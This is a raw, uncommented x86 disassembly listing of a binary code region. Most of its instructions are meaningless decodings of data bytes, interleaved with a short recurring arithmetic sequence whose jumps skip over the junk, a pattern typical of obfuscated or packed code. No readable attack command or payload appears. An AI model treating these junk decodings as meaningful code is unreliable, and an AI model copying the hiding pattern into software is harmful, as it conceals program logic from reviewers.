  40cdc0:	mov    ecx,0x47762215
  40cdc5:	xchg   DWORD PTR [eax+0x6a],ecx
  40cdc8:	push   esi
  40cdc9:	aam    0xe0
  40cdcb:	cmp    ebp,DWORD PTR [ebx]
  40cdcd:	js     0x40cda7
  40cdcf:	outs   dx,BYTE PTR ds:[esi]
  40cdd0:	lds    edi,FWORD PTR [ebp-0x5896fc28]
  40cdd6:	xchg   ecx,eax
  40cdd7:	lods   al,BYTE PTR ds:[esi]
  40cdd8:	call   0x1c60:0xad4399ec
  40cddf:	outs   dx,DWORD PTR ds:[esi]
  40cde0:	ds mov bl,0xcc
  40cde3:	mov    ecx,0xc72131f5
  40cde8:	sub    edx,DWORD PTR [ebx-0x66]
  40cdeb:	mov    cl,0x1
  40cded:	mov    cx,0xc48c
  40cdf1:	mov    edi,0xab9b7744
  40cdf6:	jno    0x40cd82
  40cdf8:	inc    ecx
  40cdf9:	aad    0xec
  40cdfb:	mov    ecx,0x1c288ac7
  40ce00:	jg     0x40cdd3
  40ce02:	or     BYTE PTR [esi+0x12597f7d],0xce
  40ce09:	test   al,0x42
  40ce0b:	xor    eax,0x12828f91
  40ce10:	sar    BYTE PTR [edx+0xb],cl
  40ce13:	int    0xfd
  40ce15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce16:	adc    WORD PTR [ecx],dx
  40ce19:	jae    0x40cdbc
  40ce1b:	fsubr  st,st(4)
  40ce1d:	out    dx,al
  40ce1e:	pushf  
  40ce1f:	or     dl,BYTE PTR [edi-0x435e55c8]
  40ce25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce26:	xchg   esp,eax
  40ce27:	loopne 0x40ce21
  40ce29:	xlat   BYTE PTR ds:[ebx]
  40ce2a:	lahf   
  40ce2b:	and    al,0x5e
  40ce2d:	inc    eax
  40ce2e:	enter  0xe6c7,0xe6
  40ce32:	ins    DWORD PTR es:[edi],dx
  40ce33:	xor    cl,BYTE PTR [edi+0x49]
  40ce36:	hlt    
  40ce37:	test   BYTE PTR [edi],cl
  40ce39:	nop
  40ce3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce3b:	add    eax,ebx
  40ce3d:	xor    eax,ecx
  40ce3f:	mov    edx,0x32729d
  40ce44:	add    eax,edx
  40ce46:	jmp    0x40cfa4
  40ce4b:	mov    dl,0xd7
  40ce4d:	or     al,0x5b
  40ce4f:	lods   eax,DWORD PTR ds:[esi]
  40ce50:	jge    0x40ce97
  40ce52:	out    0xb5,eax
  40ce54:	mov    ds:0x1c905331,eax
  40ce59:	or     BYTE PTR ds:[ebx+0x3f7e7e88],0x7f
  40ce61:	jle    0x40cee1
  40ce63:	jge    0x40ce1c
  40ce65:	jle    0x40ce48
  40ce67:	mov    ebx,0x9061a271
  40ce6c:	pop    edx
  40ce6d:	cmp    bl,ah
  40ce6f:	iret   
  40ce70:	xor    al,0x7c
  40ce72:	jl     0x40ceb4
  40ce74:	mov    eax,ds:0xb627e1b3
  40ce79:	les    edx,FWORD PTR [ecx+0x46]
  40ce7c:	mov    ch,0x9d
  40ce7e:	imul   DWORD PTR [ebx+0x6765549b]
  40ce84:	add    edi,esp
  40ce86:	xor    BYTE PTR [edx+0x47],ch
  40ce89:	pop    edi
  40ce8a:	test   al,0xbe
  40ce8d:	(bad)  
  40ce8e:	pop    DWORD PTR [edi]
  40ce90:	js     0x40ceda
  40ce92:	ds pusha 
  40ce94:	(bad)  
  40ce96:	pushf  
  40ce97:	xchg   esi,eax
  40ce98:	repnz retf 0x15b3
  40ce9c:	ds adc BYTE PTR es:[esi+edx*2+0x28],bl
  40cea2:	push   ds
  40cea3:	dec    ebp
  40cea4:	into   
  40cea5:	push   0xffffffc6
  40cea7:	xchg   ah,bh
  40cea9:	and    al,0x67
  40ceab:	jl     0x40ce3c
  40cead:	mov    ebp,0x7c14430c
  40ceb2:	or     BYTE PTR [edi-0x5eaf0778],bl
  40ceb8:	aam    0x25
  40ceba:	push   es
  40cebb:	outs   dx,BYTE PTR ds:[esi]
  40cebc:	pop    es
  40cebd:	imul   esp,edi,0x14a93a28
  40cec3:	add    ah,cl
  40cec5:	push   es
  40cec6:	xor    al,0xe2
  40cec8:	mov    eax,ds:0xf38debe4
  40cecd:	cmc    
  40cece:	(bad)  
  40cecf:	rcr    BYTE PTR [ebx],cl
  40ced1:	pop    esi
  40ced2:	clc    
  40ced3:	mov    ah,0x4d
  40ced5:	int3   
  40ced6:	fs repnz cmp cl,bh
  40ceda:	call   0xa2896378
  40cedf:	imul   ecx,DWORD PTR [eax+0x650da1d1],0xffffffde
  40cee6:	jnp    0x40cf67
  40cee8:	cmc    
  40cee9:	mov    esi,DWORD PTR ds:0x93ac4e25
  40ceef:	push   es
  40cef0:	call   0x8253da9f
  40cef5:	stos   DWORD PTR es:[edi],eax
  40cef6:	sub    eax,0x64a29fb2
  40cefb:	loopne 0x40cf57
  40cefd:	ud1    eax,DWORD PTR [eax+0x3a]
  40cf01:	shl    BYTE PTR [edx+0x27e37e43],0xf2
  40cf08:	mov    eax,ds:0x6d78d5ab
  40cf0d:	ror    BYTE PTR [edx-0x59],cl
  40cf10:	xchg   ebx,eax
  40cf11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf12:	ja     0x40cf2c
  40cf14:	test   DWORD PTR [eax+0x4e7deb45],0x15f569f8
  40cf1e:	fwait
  40cf1f:	ins    BYTE PTR es:[edi],dx
  40cf20:	gs mov ebp,0x4ff7fc86
  40cf26:	and    eax,0x2d3f9365
  40cf2b:	fwait
  40cf2c:	xlat   BYTE PTR ds:[ebx]
  40cf2d:	mov    ch,0x3c
  40cf2f:	into   
  40cf30:	into   
  40cf31:	int    0xaa
  40cf33:	jae    0x40cf36
  40cf35:	test   al,0x3e
  40cf37:	mov    ds:0xf34e7e0f,al
  40cf3c:	adc    BYTE PTR [ebp+esi*4-0x46],al
  40cf40:	add    eax,0x8533dd8
  40cf45:	or     al,0xcc
  40cf47:	xchg   edx,eax
  40cf48:	test   al,0x8d
  40cf4a:	and    eax,0x6778d15d
  40cf4f:	jmp    ecx
  40cf51:	(bad)
  40cf54:	jae    0x40cf77
  40cf56:	jle    0x40cf6c
  40cf58:	and    dh,BYTE PTR [esp+esi*2+0x53]
  40cf5c:	popa   
  40cf5d:	mov    al,ds:0x618c6ad0
  40cf62:	sub    BYTE PTR [esi-0x102fb8bf],0x75
  40cf69:	pop    es
  40cf6a:	xor    DWORD PTR ds:0x2bfdbfa9,eax
  40cf70:	add    DWORD PTR [ebx+0x7cc3b44f],edi
  40cf76:	mov    esp,0xff3ac24f
  40cf7b:	lahf   
  40cf7c:	dec    esp
  40cf7d:	adc    esp,DWORD PTR [ebp+0x48]
  40cf80:	pop    ebp
  40cf81:	jne    0x40cfad
  40cf83:	mov    edx,0x36c04fe6
  40cf88:	inc    esp
  40cf89:	jl     0x40cfda
  40cf8b:	(bad)  
  40cf8c:	call   0xc3c7:0x7f3407a2
  40cf93:	cs xchg ecx,eax
  40cf95:	mov    esp,0x14ef6757
  40cf9a:	mov    al,ds:0x4fd780f
  40cf9f:	pop    ebx
  40cfa0:	pop    ds
  40cfa1:	cmp    cl,BYTE PTR [ebx+edx*8]
  40cfa4:	mov    DWORD PTR [ebp+0x8],eax
  40cfa7:	mov    eax,DWORD PTR [ebp-0x18]
  40cfaa:	xor    eax,ecx
  40cfac:	add    eax,edx
  40cfae:	mov    edx,DWORD PTR [ebp+0x14]
  40cfb1:	imul   eax,DWORD PTR [edx]
  40cfb4:	mov    edx,DWORD PTR [ebp-0x4]
  40cfb7:	jmp    0x40d115
  40cfbc:	inc    bx
  40cfbe:	sbb    BYTE PTR [ebx+0x7b7d4d3d],dh
  40cfc4:	gs pop ss
  40cfc6:	jae    0x40cf71
  40cfc8:	sub    DWORD PTR [edx*4+0x7e894c29],esi
  40cfcf:	jle    0x40d010
  40cfd1:	jg     0x40d051
  40cfd3:	jle    0x40cf91
  40cfd5:	push   es
  40cfd6:	ret    
  40cfd7:	sbb    DWORD PTR [edi+0x360346b6],esi
  40cfdd:	or     bl,BYTE PTR [ebx+0xd]
  40cfe0:	cwde   
  40cfe1:	sti    
  40cfe2:	scas   eax,DWORD PTR es:[edi]
  40cfe3:	fcom   DWORD PTR [ebp-0x75]
  40cfe6:	retf   
  40cfe7:	mov    ds:0xdd987ae4,al
  40cfec:	lods   al,BYTE PTR ds:[esi]
  40cfed:	jns    0x40d03c
  40cfef:	or     ah,ah
  40cff1:	sar    DWORD PTR [edx],cl
  40cff3:	jns    0x40d05c
  40cff5:	in     eax,0x2a
  40cff7:	and    al,0x1c
  40cff9:	in     al,0x85
  40cffb:	pop    ebp
  40cffc:	mov    ch,BYTE PTR [edx-0x7b856590]
  40d002:	mov    ebx,0xc9d71d34
  40d007:	jg     0x40cfe4
  40d009:	test   DWORD PTR [ecx],esi
  40d00b:	hlt    
  40d00c:	pop    edi
  40d00d:	shr    DWORD PTR [edx-0x13],cl
  40d010:	in     al,dx
  40d011:	jne    0x40d085
  40d013:	inc    edx
  40d014:	(bad)  
  40d015:	pop    ecx
  40d016:	cs out 0x66,al
  40d019:	vrcpss xmm6,xmm0,xmm7
  40d01d:	push   0x36
  40d01f:	push   cs
  40d020:	or     DWORD PTR [esi],ecx
  40d022:	dec    ecx
  40d023:	jnp    0x40d08d
  40d025:	add    eax,0xdb503a98
  40d02a:	cmp    al,0x4
  40d02c:	lahf   
  40d02d:	jne    0x40d070
  40d02f:	mov    esi,0xcc40972f
  40d034:	xchg   ecx,eax
  40d035:	sbb    ecx,DWORD PTR [eax]
  40d037:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d038:	xchg   BYTE PTR [ecx-0x37],ch
  40d03b:	lods   al,BYTE PTR ds:[esi]
  40d03c:	and    edx,ecx
  40d03e:	aam    0xc7
  40d040:	(bad)  
  40d041:	pop    ecx
  40d042:	xchg   esp,eax
  40d043:	xor    eax,0xc8ecb353
  40d048:	xchg   edx,eax
  40d049:	pop    edx
  40d04a:	adc    bh,ah
  40d04c:	sub    DWORD PTR [ecx-0x6c],eax
  40d04f:	xchg   DWORD PTR [esi+0x40194bea],esp
  40d055:	sub    ebx,DWORD PTR [ebx+0x212f53c0]
  40d05b:	jg     0x40d09a
  40d05d:	sbb    DWORD PTR [ecx-0x14596eb8],0xffffffc6
  40d064:	push   0xffffffa0
  40d066:	sub    cl,cl
  40d068:	stos   BYTE PTR es:[edi],al
  40d069:	not    BYTE PTR [ebp-0x23]
  40d06c:	cld    
  40d06d:	fwait
  40d06e:	outs   dx,DWORD PTR ds:[esi]
  40d06f:	jnp    0x40d08f
  40d071:	fild   QWORD PTR [ebp-0x505dbc28]
  40d077:	bound  edx,QWORD PTR ds:0x52080ba9
  40d07d:	ss ins DWORD PTR es:[edi],dx
  40d07f:	repnz sti 
  40d081:	mov    ebp,0xd483c4ff
  40d086:	adc    ebx,DWORD PTR [edx+0x4b4c3d67]
  40d08c:	sub    ebp,ebx
  40d08e:	xor    al,0x61
  40d090:	xchg   bh,al
  40d092:	push   edi
  40d093:	and    al,0x33
  40d095:	loope  0x40d041
  40d097:	leave  
  40d098:	push   edx
  40d099:	mov    esi,0xd50839a8
  40d09e:	jl     0x40d067
  40d0a0:	mov    ebx,0x3eb4bfb5
  40d0a5:	or     cl,BYTE PTR [ebx]
  40d0a7:	pushf  
  40d0a8:	cmp    al,0xb0
  40d0aa:	jecxz  0x40d0ec
  40d0ac:	int3   
  40d0ad:	cmc    
  40d0ae:	jl     0x40d06d
  40d0b0:	cs pop ecx
  40d0b2:	push   ss
  40d0b3:	ins    BYTE PTR es:[edi],dx
  40d0b4:	xchg   ecx,eax
  40d0b5:	and    al,0x56
  40d0b7:	cmp    DWORD PTR [esp+edi*4-0xd],ecx
  40d0bb:	pop    ebx
  40d0bc:	dec    edx
  40d0bd:	cmc    
  40d0be:	push   esp
  40d0bf:	push   0xf96052ae
  40d0c4:	or     eax,0xce98ee44
  40d0c9:	pop    esi
  40d0ca:	fnstsw WORD PTR [eax]
  40d0cc:	(bad)
  40d0d0:	mov    ch,0xe0
  40d0d2:	fdiv   QWORD PTR [edx+0x1b]
  40d0d5:	push   edx
  40d0d6:	bound  ebp,QWORD PTR [edx+0x320e7f01]
  40d0dc:	or     BYTE PTR [edi-0xb],cl
  40d0df:	fisubr WORD PTR [esi-0x1cef60c1]
  40d0e5:	out    0x86,al
  40d0e7:	xor    ebx,DWORD PTR [eax-0x6a]
  40d0ea:	inc    esi
  40d0eb:	mov    dh,0xc1
  40d0ed:	lock inc esi
  40d0ef:	jge    0x40d13d
  40d0f1:	mov    eax,0x2116532d
  40d0f6:	sub    eax,0xa9ef0cd4
  40d0fb:	mov    cl,0xbd
  40d0fd:	sti    
  40d0fe:	adc    ebx,ebx
  40d100:	add    BYTE PTR [ecx],ah
  40d102:	fwait
  40d103:	pop    es
  40d104:	ficom  DWORD PTR [esi-0x63]
  40d107:	jno    0x40d154
  40d109:	ins    BYTE PTR es:[edi],dx
  40d10a:	gs jecxz 0x40d08e
  40d10d:	mov    eax,DWORD PTR [ecx-0x69]
  40d110:	pop    ebp
  40d111:	shr    BYTE PTR [ebx+eiz*4],cl
  40d114:	test   al,0x33
  40d116:	ror    DWORD PTR [ebx-0x7372f7b3],1
  40d11c:	or     bl,BYTE PTR [ebp+0x3b003272]
  40d122:	enter  0x840f,0xe9
  40d126:	add    eax,0x7d8b0000
  40d12b:	call   0x8b4916bb
  40d130:	push   ebp
  40d131:	adc    al,0x8b
  40d133:	inc    esp
  40d134:	add    BYTE PTR [ecx+edi*4],0x56
  40d138:	or     BYTE PTR [ecx+0x7],dl
  40d13b:	xor    edx,edx
  40d13d:	xor    edi,ecx
  40d13f:	mov    esi,0x32729d
  40d144:	add    edi,esi
  40d146:	div    edi
  40d148:	mov    edx,DWORD PTR [ebp-0x4]
  40d14b:	xor    edx,ecx
  40d14d:	jmp    0x40d2ab
  40d152:	jno    0x40d19e
  40d154:	cmp    eax,ecx
  40d156:	jge    0x40d1b9
  40d158:	in     eax,dx
  40d159:	pop    edx
  40d15a:	xor    ch,0xa8
  40d15d:	cmp    BYTE PTR [edx+eiz*1-0x74f23fb7],0x7e
  40d165:	jle    0x40d1a6
  40d167:	jg     0x40d1e7
  40d169:	jle    0x40d187
  40d16b:	adc    DWORD PTR [ecx],edx
  40d16d:	(bad)  
  40d16e:	jne    0x40d15d
  40d170:	sahf   
  40d171:	sbb    ch,BYTE PTR [edx+0x2e9cd052]
  40d177:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d179:	mov    cl,0xd5
  40d17b:	imul   ebp,DWORD PTR [ebp-0x1ac56686],0xc0368087
  40d185:	lds    edi,FWORD PTR [ecx]
  40d187:	xchg   DWORD PTR [esi],eax
  40d189:	inc    eax
  40d18a:	inc    ebp
  40d18b:	push   esi
  40d18c:	pop    ss
  40d18d:	adc    DWORD PTR [edx-0x44],0xcce027dc
  40d194:	fimul  WORD PTR [esi-0x7610bb47]
  40d19a:	js     0x40d1c5
  40d19c:	imul   ecx,DWORD PTR [esp+esi*2],0x826ff4cf
  40d1a3:	outs   dx,DWORD PTR ds:[esi]
  40d1a4:	rol    DWORD PTR [ebp-0x3],1
  40d1a7:	outs   dx,DWORD PTR ds:[esi]
  40d1a8:	lea    edi,[ebx+0x65f66332]
  40d1ae:	xchg   ecx,eax
  40d1af:	or     al,0x79
  40d1b1:	pop    esi
  40d1b2:	das    
  40d1b3:	es xchg ebp,eax
  40d1b5:	hlt    
  40d1b6:	test   eax,0x44aa8162
  40d1bb:	js     0x40d1d3
  40d1bd:	sar    DWORD PTR [ebp+0x4e],0xab
  40d1c1:	call   0x6b8f:0x4a3f0b63
  40d1c8:	outs   dx,DWORD PTR ds:[esi]
  40d1c9:	cmp    al,0x76
  40d1cb:	xor    DWORD PTR [ebx+0x25ede292],esi
  40d1d1:	sbb    ebp,ebp
  40d1d3:	add    DWORD PTR [ebx+0xaa6414c],edi
  40d1d9:	dec    edi
  40d1da:	in     eax,dx
  40d1db:	jmp    0x452fc3bc
  40d1e0:	das    
  40d1e1:	or     al,0x6
  40d1e3:	popf   
  40d1e4:	cmp    al,0xa0
  40d1e6:	jae    0x40d19d
  40d1e8:	ds fcmovbe st,st(5)
  40d1eb:	jo     0x40d24a
  40d1ed:	or     BYTE PTR [eax+0x4f85a5fb],bh
  40d1f3:	jne    0x40d18b
  40d1f5:	xchg   edx,eax
  40d1f6:	aad    0xd5
  40d1f8:	adc    esp,DWORD PTR [edi]
  40d1fa:	scas   al,BYTE PTR es:[edi]
  40d1fb:	mov    al,0x2d
  40d1fd:	jnp    0x40d181
  40d1ff:	nop
  40d200:	or     DWORD PTR [edi],eax
  40d202:	repz or edi,DWORD PTR [ebp+0x56]
  40d206:	adc    al,BYTE PTR [esi+ecx*4+0x6d]
  40d20a:	xor    BYTE PTR [edi-0xaa76ca1],dh
  40d210:	iret   
  40d211:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d212:	ins    DWORD PTR es:[edi],dx
  40d213:	shr    DWORD PTR [ecx],0x54
  40d216:	xchg   DWORD PTR [edi+esi*2+0x5e],eax
  40d21a:	fdivr  st(3),st
  40d21c:	in     eax,0xeb
  40d21e:	xchg   ecx,eax
  40d21f:	(bad)  
  40d220:	je     0x40d208
  40d222:	inc    BYTE PTR [edi]
  40d224:	je     0x40d294
  40d226:	das    
  40d227:	pop    ecx
  40d228:	or     eax,ebx
  40d22a:	pushf  
  40d22b:	pop    ss
  40d22c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d22d:	mov    eax,ds:0x47691261
  40d232:	jbe    0x40d1cd
  40d234:	fsubr  DWORD PTR [esp+ebx*4]
  40d237:	aas    
  40d238:	sub    BYTE PTR [edi+0x103e0e1a],al
  40d23e:	stos   BYTE PTR es:[edi],al
  40d23f:	xor    al,cl
  40d241:	outs   dx,DWORD PTR ds:[esi]
  40d242:	aas    
  40d243:	xor    ebx,DWORD PTR [ebx+0x6b]
  40d246:	icebp  
  40d247:	ret    0xe85b
  40d24a:	add    bh,BYTE PTR [esi+0x1d0307d5]
  40d250:	jb     0x40d1e5
  40d252:	push   es
  40d253:	push   ebp
  40d254:	out    dx,eax
  40d255:	or     DWORD PTR [ebx],ecx
  40d257:	xor    edx,DWORD PTR [eax+0x1e91a03b]
  40d25d:	ins    DWORD PTR es:[edi],dx
  40d25e:	scas   al,BYTE PTR es:[edi]
  40d25f:	xchg   edi,eax
  40d260:	pop    ss
  40d261:	push   ebp
  40d262:	jne    0x40d2d4
  40d264:	pop    esp
  40d265:	push   es
  40d266:	ins    BYTE PTR es:[edi],dx
  40d267:	icebp  
  40d268:	ss mov al,0xec
  40d26b:	std    
  40d26c:	mov    eax,0xe89580eb
  40d271:	cmp    eax,0xe1d164ce
  40d276:	pop    es
  40d277:	xchg   ecx,eax
  40d278:	rol    DWORD PTR [edi-0x17],0xae
  40d27c:	mov    eax,ds:0xba4a3148
  40d281:	inc    esp
  40d282:	loope  0x40d24f
  40d284:	repnz or esp,ebx
  40d287:	push   ebx
  40d288:	jno    0x40d251
  40d28a:	stc    
  40d28b:	ins    DWORD PTR es:[edi],dx
  40d28c:	mov    ah,0xf5
  40d28e:	push   esp
  40d28f:	xor    BYTE PTR [ebx+0x19fccb0c],bl
  40d295:	repnz mov al,ds:0x442bb76e
  40d29b:	stos   BYTE PTR es:[edi],al
  40d29c:	mov    ch,0x4a
  40d29e:	fld    DWORD PTR [edx]
  40d2a0:	mov    ecx,0xfc96d494
  40d2a5:	mov    ecx,DWORD PTR [edx+0x37]
  40d2a8:	mov    esp,0x848d603c
  40d2ad:	add    bl,BYTE PTR [ebp-0x74ffcd8e]
  40d2b3:	push   ebp
  40d2b4:	or     BYTE PTR [ebx+0x489dc7d],cl
  40d2ba:	xchg   edi,eax
  40d2bb:	mov    eax,DWORD PTR [ebp-0x18]
  40d2be:	mov    edx,DWORD PTR [ebp+0x8]
  40d2c1:	xor    eax,ecx
  40d2c3:	lea    eax,[eax+edx*1+0x32729d]
  40d2ca:	mov    DWORD PTR [ebp+0x8],eax
  40d2cd:	mov    eax,DWORD PTR [ebp-0x18]
  40d2d0:	jmp    0x40d42e
  40d2d5:	cs adc al,0xbd
  40d2d8:	jecxz  0x40d297
  40d2da:	jnp    0x40d354
  40d2dc:	aad    0x3a
  40d2de:	lock mov al,0x98
  40d2e1:	inc    esi
  40d2e2:	in     eax,0x39
  40d2e4:	inc    esp
  40d2e5:	into   
  40d2e6:	mov    WORD PTR [esi+0x7e],?
  40d2e9:	aas    
  40d2ea:	jg     0x40d36a
  40d2ec:	jle    0x40d33b
  40d2ee:	rol    esi,0xd7
  40d2f1:	adc    ebp,eax
  40d2f3:	shl    BYTE PTR [esi+0x47],cl
  40d2f6:	call   0xe681eaa3
  40d2fb:	sub    DWORD PTR [edx+ebp*1],0xffffffc3
  40d2ff:	hlt    
  40d300:	xor    ah,BYTE PTR [ecx+0x45]
  40d303:	mov    eax,ds:0x585b850b
  40d308:	cmp    eax,0x1f7b2c68
  40d30d:	mov    ah,0x35
  40d30f:	xchg   esi,eax
  40d310:	std    
  40d311:	(bad)  
  40d312:	(bad)  
  40d314:	pop    ebx
  40d315:	pop    eax
  40d316:	loop   0x40d2b8
  40d318:	xor    esi,DWORD PTR [ecx+0x6c999c09]
  40d31e:	inc    eax
  40d31f:	jmp    0x13e3:0x7226ba8d
  40d326:	lods   eax,DWORD PTR ds:[esi]
  40d327:	sub    BYTE PTR [ebx-0x26],al
  40d32a:	xchg   esi,eax
  40d32b:	mov    ebp,0x69477ffe
  40d330:	jo     0x40d352
  40d332:	push   0xc1257a6f
  40d337:	dec    ebx
  40d338:	pop    esp
  40d339:	ds pop ebx
  40d33b:	(bad)  
  40d33c:	(bad)  
  40d33d:	mov    ds:0x9c34bd41,eax
  40d342:	popf   
  40d343:	push   edx
  40d344:	xchg   al,al
  40d346:	xchg   esp,eax
  40d347:	mov    DWORD PTR [eiz*8+0x5ca9dbe2],esi
  40d34e:	cmp    eax,0xbf6c6cf9
  40d353:	out    0xcd,eax
  40d355:	lea    edx,[ebx-0x40]
  40d358:	stos   DWORD PTR es:[edi],eax
  40d359:	sbb    BYTE PTR [edi],bl
  40d35b:	fisubr WORD PTR [ebx+0x339836c]
  40d361:	cmp    ch,BYTE PTR [ecx-0x2e]
  40d364:	push   eax
  40d365:	add    ah,ch
  40d367:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d368:	into   
  40d369:	(bad)  
  40d36a:	lds    edi,FWORD PTR [ebp+0x49]
  40d36d:	outs   dx,BYTE PTR ds:[esi]
  40d36e:	cld    
  40d36f:	repz pop ss
  40d371:	jae    0x40d303
  40d373:	lock cmp bh,BYTE PTR [edx+ecx*8]
  40d377:	shl    BYTE PTR [ebx],cl
  40d379:	sub    DWORD PTR [ebp-0x4],0x35
  40d37d:	mov    eax,0x36b399b8
  40d382:	test   DWORD PTR [eax-0x3636a5c0],edi
  40d388:	pop    eax
  40d389:	jge    0x40d3a8
  40d38b:	aaa    
  40d38c:	js     0x40d3cb
  40d38e:	sub    ebp,ebx
  40d390:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d391:	pop    edi
  40d392:	mov    ecx,0x74c353a2
  40d397:	lock ins DWORD PTR es:[edi],dx
  40d399:	outs   dx,DWORD PTR ds:[esi]
  40d39a:	in     eax,dx
  40d39b:	mov    ds:0xe7b8b466,eax
  40d3a0:	cmc    
  40d3a1:	addr16 add al,0x25
  40d3a4:	mov    ah,0x27
  40d3a6:	jnp    0x40d34f
  40d3a8:	mov    edi,0x585b7df6
  40d3ad:	test   DWORD PTR [edi],edi
  40d3af:	jp     0x40d3be
  40d3b1:	stos   BYTE PTR es:[edi],al
  40d3b2:	xchg   ebx,ebx
  40d3b4:	lahf   
  40d3b5:	push   0x0
  40d3b7:	mov    ch,ah
  40d3b9:	push   esp
  40d3ba:	and    DWORD PTR [ebx+0x5c],eax
  40d3bd:	lds    edi,FWORD PTR [ebx]
  40d3bf:	fld    QWORD PTR [ebp-0x72438b0d]
  40d3c5:	lds    ebp,FWORD PTR [edi+0x5b]
  40d3c8:	enter  0x7f78,0x9
  40d3cc:	mov    ds:0xc2bbc813,eax
  40d3d1:	and    eax,DWORD PTR [esi-0x198de0fd]
  40d3d7:	mov    eax,ecx
  40d3d9:	rol    BYTE PTR [ebx-0xe069e33],1
  40d3df:	adc    cl,BYTE PTR cs:[edx]
  40d3e2:	cld    
  40d3e3:	push   ebp
  40d3e4:	xchg   edi,eax
  40d3e5:	pop    eax
  40d3e6:	icebp  
  40d3e7:	mov    cl,BYTE PTR [ecx-0x5941ff67]
  40d3ed:	data16 cli 
  40d3ef:	adc    ebx,DWORD PTR [ebp+edi*8-0x1526b55a]
  40d3f6:	addr16 or al,ch
  40d3f9:	mov    esi,0x78b4f32
  40d3fe:	(bad)  
  40d3ff:	xlat   BYTE PTR ds:[ebx]
  40d400:	outs   dx,BYTE PTR ds:[esi]
  40d401:	or     eax,0xbbd3ab7e
  40d406:	das    
  40d407:	cmp    eax,0x50194670
  40d40c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d40d:	mov    ebx,0xd72c21c9
  40d412:	daa    
  40d413:	and    BYTE PTR [ebx-0x45],0xd9
  40d417:	and    ebx,DWORD PTR [ecx-0x3]
  40d41a:	loopne 0x40d426
  40d41c:	aas    
  40d41d:	loop   0x40d43a
  40d41f:	adc    eax,0x1e613b27
  40d424:	xchg   BYTE PTR [ebp+ebp*1-0x5b01b034],ah
  40d42b:	push   0xfffffff9
  40d42d:	or     cl,BYTE PTR [ebx-0x3eccebab]
  40d433:	add    eax,esi
  40d435:	imul   eax,DWORD PTR [edx]
  40d438:	jmp    0x40d596
  40d43d:	into   
  40d43e:	jb     0x40d482
  40d440:	pop    ecx
  40d441:	inc    edx
  40d442:	pop    ecx
  40d443:	fisttp QWORD PTR [ebp+0x677a88e4]
  40d449:	dec    edi
  40d44a:	hlt    
  40d44b:	cmc    
  40d44c:	lds    ecx,FWORD PTR [edi+0x3f7e7e8d]
  40d452:	jg     0x40d4d2
  40d454:	jle    0x40d4cb
  40d456:	pop    ecx
  40d457:	mov    al,ds:0xf4ad0ae3
  40d45c:	push   ss
  40d45d:	icebp  
  40d45e:	lods   eax,DWORD PTR ds:[esi]
  40d45f:	mov    ah,0x54
  40d461:	icebp  
  40d462:	xor    eax,0x967e1f85
  40d467:	stc    
  40d468:	adc    edx,eax
  40d46a:	out    dx,eax
  40d46b:	ds in  al,dx
  40d46d:	iret   
  40d46e:	clc    
  40d46f:	adc    al,BYTE PTR [eax+eax*8-0x4c]
  40d473:	lods   eax,DWORD PTR ds:[esi]
  40d474:	pop    ecx
  40d475:	push   ebp
  40d476:	mov    bh,0x39
  40d478:	cdq    
  40d479:	popa   
  40d47a:	(bad)  
  40d47b:	das    
  40d47c:	adc    cl,BYTE PTR [ecx+0x4f27aec0]
  40d482:	(bad)  
  40d483:	sbb    BYTE PTR [edx],bl
  40d485:	and    DWORD PTR [eax+0x558cd141],0xd0e9b367
  40d48f:	aaa    
  40d490:	cli    
  40d491:	push   esi
  40d492:	shl    BYTE PTR [ecx*4+0x22e1f084],cl
  40d499:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d49a:	dec    esp
  40d49b:	mov    dh,0x3b
  40d49d:	and    BYTE PTR [ebp-0x7791924c],ch
  40d4a3:	fnsave [esi]
  40d4a5:	push   cs
  40d4a6:	jecxz  0x40d50b
  40d4a8:	std    
  40d4a9:	cmp    eax,0xe83cafdd
  40d4ae:	xchg   DWORD PTR [eax+edx*1],esp
  40d4b1:	into   
  40d4b2:	mov    edi,0xaa7ac1b0
  40d4b7:	ret    
  40d4b8:	test   BYTE PTR [eax],al
  40d4ba:	inc    ecx
  40d4bb:	ins    DWORD PTR es:[edi],dx
  40d4bc:	into   
  40d4bd:	retf   
  40d4be:	popa   
  40d4bf:	add    esp,DWORD PTR [eax]
  40d4c1:	xchg   edx,eax
  40d4c2:	mov    al,0x9
  40d4c4:	cmp    al,al
  40d4c6:	adc    al,0x1c
  40d4c8:	mov    ebp,0xe03d95f2
  40d4cd:	jne    0x40d4c1
  40d4cf:	loop   0x40d4c2
  40d4d1:	ds xchg esp,eax
  40d4d3:	and    DWORD PTR [edi],esi
  40d4d5:	nop
  40d4d6:	aaa    
  40d4d7:	stos   DWORD PTR es:[edi],eax
  40d4d8:	out    dx,al
  40d4d9:	jne    0x40d4f2
  40d4db:	cdq    
  40d4dc:	jge    0x40d4e6
  40d4de:	xchg   ebp,eax
  40d4df:	mov    ebx,0xef05719e
  40d4e4:	cmp    ebp,DWORD PTR [esi-0x2828bd00]
  40d4ea:	pusha  
  40d4eb:	push   0x448d93d0
  40d4f0:	mov    ebp,0x148b0c76
  40d4f5:	jge    0x40d4a5
  40d4f7:	fbld   TBYTE PTR [edi+0xaee50d7]
  40d4fd:	sub    BYTE PTR fs:[esi],dl
  40d500:	je     0x40d4b7
  40d502:	add    al,0xa0
  40d504:	lea    eax,[ebx]
  40d506:	aam    0x42
  40d508:	cmp    ecx,DWORD PTR [edx+0x5]
  40d50b:	or     BYTE PTR [eax],ch
  40d50d:	(bad)  
  40d50e:	sti    
  40d50f:	xor    BYTE PTR [eax-0x6d],bl
  40d512:	mov    ebp,0xb3af7444
  40d517:	popa   
  40d518:	push   edi
  40d519:	push   edx
  40d51a:	leave  
  40d51b:	xchg   ebp,eax
  40d51c:	xor    ecx,edi
  40d51e:	retf   0xbe4c
  40d521:	fsub   DWORD PTR [ebx]
  40d523:	mov    dh,0x38
